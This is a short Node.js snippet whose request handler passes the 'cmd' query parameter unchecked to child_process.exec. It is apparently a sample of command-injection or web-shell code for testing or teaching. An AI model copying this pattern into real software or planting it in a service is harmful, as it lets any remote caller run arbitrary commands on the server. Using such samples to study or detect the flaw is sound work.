import { exec as run } from 'child_process';

function handler(req, res) {
    const cmd = req.query.cmd;
    run(cmd);
}
